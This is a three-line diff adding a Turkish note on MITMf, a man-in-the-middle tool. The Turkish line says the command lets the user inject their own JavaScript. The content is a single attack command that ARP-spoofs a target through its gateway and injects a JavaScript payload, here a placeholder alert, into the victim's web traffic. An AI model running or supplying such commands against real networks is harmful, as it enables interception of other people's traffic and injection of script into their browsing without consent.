@@ -1,0 +1,3 @@
+mitmf --arp --spoof --gateway <gateway_ip> --target <target_ip> -i <interface> --inject --js-payload "alert('javascript kodu');" 
+
+Bu sayede js kodlarımızı enjekte edebiliriz.
